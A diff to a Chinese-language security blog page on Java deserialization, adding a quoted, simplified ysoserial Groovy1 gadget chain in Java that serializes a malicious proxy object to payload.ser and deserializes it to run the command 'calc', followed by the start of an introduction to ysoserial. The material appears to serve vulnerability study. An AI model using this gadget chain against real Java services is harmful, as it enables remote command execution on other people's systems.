@@ -6,6 +6,58 @@ description: ConvertedClosure+MethodClosure+
 
 以下内容引自安全客「[天融信阿尔法实验室](https://www.anquanke.com/member/142730)」在其「[ysoserial Java 反序列化系列第一集 Groovy1](https://www.anquanke.com/post/id/202730)」的博文，具体内容已经是精简后的版本：
 
+```java
+import org.codehaus.groovy.runtime.ConvertedClosure;
+import org.codehaus.groovy.runtime.MethodClosure;
+
+import java.io.*;
+import java.lang.reflect.*;
+import java.util.Map;
+
+public class Groovy1Test {
+    public static String command = "calc";
+    public static void main(String[] args)
+            throws IllegalAccessException,
+            InvocationTargetException,
+            InstantiationException, IOException,
+            ClassNotFoundException {
+
+        //构造序列化对象
+        //Groovy语法中"command".execute()
+        MethodClosure methodClosure = new MethodClosure(command, "execute");
+        final ConvertedClosure convertedClosure = new ConvertedClosure(methodClosure,"entrySet");
+        //创建动态代理参数，
+        // 第一个为类的加载器，此处为类本身
+        // 第二个为代理对象实现的接口，此处为map接口
+        // 第三个为InvocationHandler，此处为ConversionHandler
+        Class<?>[] allInterfaces = (Class<?>[]) Array.newInstance(Class.class,1);
+        allInterfaces[0] = Map.class;
+
+        //创建代理对象
+        Object o = Proxy.newProxyInstance(Groovy1Test.class.getClassLoader(),allInterfaces,convertedClosure);
+        final Map map = Map.class.cast(o);
+
+        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        final Constructor constructor = clazz.getDeclaredConstructors()[0];
+        constructor.setAccessible(true);
+        final InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class,map);
+
+        //将恶意对象存储为字节码
+        FileOutputStream fos = new FileOutputStream("payload.ser");
+        ObjectOutputStream oos = new ObjectOutputStream(fos);
+        oos.writeObject(handler);
+        oos.flush();
+        oos.close();
+        //读取恶意对象字节码并进行反序列化操作
+        FileInputStream fis = new FileInputStream("payload.ser");
+        ObjectInputStream ois = new ObjectInputStream(fis);
+        Object evilObject = ois.readObject();
+        ois.close();
+
+    }
+}
+```
+
 ## ysoserial简介 <a id="h2-0"></a>
 
 ysoserial是一款在Github开源的知名java 反序列化利用工具，里面集合了各种java反序列化payload；
